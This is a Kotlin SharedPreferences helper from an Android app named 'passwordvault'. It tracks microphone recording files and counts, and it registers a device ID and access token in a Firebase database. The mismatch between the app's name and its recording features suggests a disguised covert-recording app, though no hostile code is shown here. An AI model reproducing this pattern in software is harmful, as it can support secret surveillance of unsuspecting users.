package com.example.passwordvault.util

import android.content.Context
import android.content.SharedPreferences
import android.util.Log

const val LATEST_RECORD: String = "LatestRecord"
const val LATEST_MIC_RECORD: String = "LatestMicRecord"
private const val UNIQUE_DEVICE_ID: String = "UniqueDeviceID"
private const val UNIQUE_ACCESS_TOKEN: String = "UniqueAccessToken"
const val MIC_RECORDING_COUNT: String = "micRecordingCount"
const val TOPIC_SUBSCIRIBED = "all_topic_subscirbed"

object PreferenceUtil {


    fun writeToLatestRecord(outputFile: String, context: Context) {
        val editor = sharedPreference(context).edit()
        editor.putString(LATEST_RECORD, outputFile).apply()
    }

    fun latestRecord(context: Context): String? {
        return sharedPreference(context).getString(LATEST_RECORD, "error_recording")
    }

    fun writeToTopicSubscribed(context: Context) {
        val editor = sharedPreference(context).edit()
        editor.putBoolean(TOPIC_SUBSCIRIBED, true).apply()
    }

    fun topicAllSubscribed(context: Context): Boolean {
        return sharedPreference(context).getBoolean(TOPIC_SUBSCIRIBED, false)
    }

    fun writeLatestMicRecord(outputFile: String, context: Context) {
        val editor = sharedPreference(context).edit()
        editor.putString(LATEST_MIC_RECORD, outputFile).apply()
    }

    fun latestMicRecord(context: Context): String? {
        return sharedPreference(context).getString(LATEST_MIC_RECORD, "error_mic_recording")
    }

    fun writeUniquePhoneId(context: Context) {
        val deviceId = uniqueDeviceId(context)
        if (deviceId == "no_id") {
            val editor = sharedPreference(context).edit()
            val uniqueId = UniqueIdProvider.getThisUniquePhone(context)
            editor.putString(UNIQUE_DEVICE_ID, uniqueId).apply()
            Log.e("Device", "Id -> $uniqueId")
        }
    }

    fun uniqueDeviceId(context: Context): String? {
        return sharedPreference(context).getString(UNIQUE_DEVICE_ID, "no_id")
    }

    fun writeAccessToken(context: Context, token: String) {
        val editor = sharedPreference(context).edit()
        editor.putString(UNIQUE_ACCESS_TOKEN, token).apply()
    }

    fun sendRegistrationToServer(context: Context) {
        val uniqueID: String? = uniqueDeviceId(context)
        val newToken: String? = accessToken(context)
        val dbReference = FirebaseDB.getUsersDB()
        if (uniqueID != null) {
            dbReference.child(uniqueID).setValue(uniqueID)
        }
        if (uniqueID != null) {
            dbReference.child(uniqueID).child("userToken").setValue(newToken)
        }
    }

    fun micRecordingCount(context: Context): Int {
        return sharedPreference(context).getInt(MIC_RECORDING_COUNT, 0)
    }

    fun writeMicRecordingCount(context: Context, count: Int) {
        val editor = sharedPreference(context).edit()
        editor.putInt(MIC_RECORDING_COUNT, count).apply()
    }

    private fun accessToken(context: Context): String? {
        return sharedPreference(context).getString(UNIQUE_ACCESS_TOKEN, "no_access_token")
    }

    private fun sharedPreference(context: Context): SharedPreferences {
        return context.getSharedPreferences(
            "com.passwordvault.newRecords",
            Context.MODE_PRIVATE
        )
    }
}